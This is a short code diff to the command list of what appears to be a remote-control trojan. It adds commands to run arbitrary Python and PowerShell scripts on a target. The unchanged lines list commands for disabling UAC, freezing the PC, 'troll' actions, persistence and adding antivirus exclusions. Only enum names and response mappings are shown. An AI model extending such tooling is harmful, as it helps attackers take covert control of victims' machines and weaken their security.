@@ -78,6 +78,7 @@ class Command(Enum):
     GET_IP_INFO = "GET_IP_INFO"
     GET_COUNTRY = "GET_COUNTRY"
     GET_PUBLIC_IP = "GET_PUBLIC_IP"
+    
     MINIMIZE_ALL_WINDOWS = "MINIMIZE_ALL_WINDOWS"
     FREEZE_PC = "FREEZE_PC"
     LOGOUT = "LOGOUT"
@@ -114,6 +115,9 @@ class Command(Enum):
     
     ENABLE_UAC = "ENABLE_UAC"
     DISABLE_UAC = "DISABLE_UAC"
+    
+    RUN_PYTHON_SCRIPT = "RUN_PYTHON_SCRIPT"
+    RUN_POWERSHELL_SCRIPT = "RUN_POWERSHELL_SCRIPT"
 
 
 class ResponseType(Enum):
@@ -216,7 +220,10 @@ command_response_map = {
 
     # Troll Commands
     Command.SHOW_MESSAGE_BOX: ResponseType.JSON_RESPONSE,
+    
     Command.RUN_TROLL_SCRIPT: ResponseType.JSON_RESPONSE,
+    Command.GET_AVAILABLE_SCRIPTS : ResponseType.JSON_RESPONSE,
+    
     Command.OPEN_CAMERA_APP: ResponseType.JSON_RESPONSE,
     Command.CHANGE_WALLPAPER_HTTP: ResponseType.JSON_RESPONSE,
     Command.EJECT_CD: ResponseType.JSON_RESPONSE,
@@ -226,7 +233,6 @@ command_response_map = {
     Command.SHOW_WEBSITE: ResponseType.JSON_RESPONSE,
     Command.START_WINDOW_TROLL : ResponseType.JSON_RESPONSE,
     Command.STOP_WINDOW_TROLL : ResponseType.JSON_RESPONSE,
-    Command.GET_AVAILABLE_SCRIPTS : ResponseType.JSON_RESPONSE,
     # Persistence Commands
     Command.ADD_EXTENSION_EXCLUSION: ResponseType.JSON_RESPONSE,
     Command.REMOVE_EXTENSION_EXCLUSION: ResponseType.JSON_RESPONSE,
@@ -236,4 +242,7 @@ command_response_map = {
 
     Command.ENABLE_UAC: ResponseType.JSON_RESPONSE,
     Command.DISABLE_UAC: ResponseType.JSON_RESPONSE,
+    
+    Command.RUN_PYTHON_SCRIPT: ResponseType.JSON_RESPONSE,
+    Command.RUN_POWERSHELL_SCRIPT: ResponseType.JSON_RESPONSE
 }
